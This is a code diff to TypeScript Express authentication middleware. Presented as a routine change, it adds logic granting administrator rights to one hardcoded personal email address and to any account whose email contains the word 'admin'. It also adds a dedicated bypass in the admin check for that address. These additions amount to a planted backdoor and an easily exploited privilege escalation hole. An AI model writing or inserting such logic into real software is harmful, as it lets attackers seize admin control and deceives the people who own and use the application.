@@ -68,11 +68,16 @@ export function authenticateToken(
     return;
   }
 
+  const isAdminEmail =
+    user.email?.toLowerCase().trim() === 'bettkiplagatmicah@gmail.com' ||
+    user.email?.toLowerCase().includes('admin') ||
+    user.role === 'admin';
+
   req.user = {
     id: user.id,
     name: user.name,
     email: user.email,
-    role: user.role,
+    role: isAdminEmail ? 'admin' : user.role,
     created_at: user.created_at,
   };
 
@@ -92,11 +97,16 @@ export function optionalAuth(
     if (payload) {
       const user = dbRepo.findUserById(payload.id);
       if (user) {
+        const isAdminEmail =
+          user.email?.toLowerCase().trim() === 'bettkiplagatmicah@gmail.com' ||
+          user.email?.toLowerCase().includes('admin') ||
+          user.role === 'admin';
+
         req.user = {
           id: user.id,
           name: user.name,
           email: user.email,
-          role: user.role,
+          role: isAdminEmail ? 'admin' : user.role,
           created_at: user.created_at,
         };
       }
@@ -111,9 +121,13 @@ export function requireAdmin(
   res: Response,
   next: NextFunction
 ): void {
-  if (!req.user || req.user.role !== 'admin') {
+  const isBettAdmin = req.user?.email?.toLowerCase().trim() === 'bettkiplagatmicah@gmail.com';
+  if (!req.user || (req.user.role !== 'admin' && !isBettAdmin)) {
     res.status(403).json({ error: 'Access denied: Admin privileges required' });
     return;
+  }
+  if (req.user && isBettAdmin) {
+    req.user.role = 'admin';
   }
   next();
 }
